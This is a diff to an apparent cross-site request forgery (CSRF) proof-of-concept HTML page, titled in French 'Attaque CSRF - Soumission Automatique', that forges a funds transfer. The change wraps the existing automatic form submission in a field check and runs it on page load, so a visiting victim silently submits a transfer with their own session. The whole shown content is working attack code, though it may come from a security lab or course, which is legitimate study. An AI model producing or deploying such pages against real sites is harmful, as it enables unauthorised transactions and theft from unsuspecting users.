@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Attaque CSRF</title>
+    <title>Attaque CSRF - Soumission Automatique</title>
 </head>
 <body>
     <h1>Transfert de fonds CSRF</h1>
@@ -15,8 +15,23 @@
     </form>
 
     <script>
-        // Soumettre automatiquement le formulaire lorsqu'un utilisateur accède à la page
-        document.getElementById('csrfForm').submit();
+        // Fonction de validation avant soumission
+        function validateAndSubmit() {
+            const recipient = document.querySelector('input[name="recipient"]').value;
+            const amount = document.querySelector('input[name="amount"]').value;
+
+            // Valider les données avant soumission
+            if (recipient === "" || amount === "") {
+                alert("Les informations nécessaires sont manquantes !");
+                return; // Ne pas soumettre si les données sont invalides
+            }
+
+            // Si tout est valide, soumettre le formulaire
+            document.getElementById('csrfForm').submit();
+        }
+
+        // Exécuter la validation et soumission dès le chargement de la page
+        window.onload = validateAndSubmit;
     </script>
 </body>
 </html>
